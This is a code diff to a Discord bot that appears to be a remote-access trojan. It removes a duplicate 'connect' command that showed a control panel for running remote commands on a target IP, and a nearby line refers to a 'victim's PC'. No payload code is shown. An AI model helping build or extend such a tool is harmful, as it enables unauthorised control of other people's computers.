@@ -548,25 +548,6 @@ class MessageModal(discord.ui.Modal, title="Fynox sent a message"):
         await interaction.response.send_message("Message displayed on victim's PC.")
 
 @bot.command(name='connect')
-async def connect(ctx, ip: str):
-    """Display the control panel with all buttons"""
-    embed = discord.Embed(
-        title="🎮 Control Panel",
-        description=f"Remote access controls for: {ip}",
-        color=discord.Color.blue(),
-        timestamp=datetime.datetime.now()
-    )
-    
-    embed.add_field(
-        name="Available Controls", 
-        value="Click the buttons below to execute remote commands", 
-        inline=False
-    )
-    
-    view = ControlView(ctx.author.id)
-    await ctx.send(embed=embed, view=view)
-
-@bot.command(name='connect')
 async def connect(ctx):
     """Zeigt das Control Panel mit allen Funktionen"""
     try:
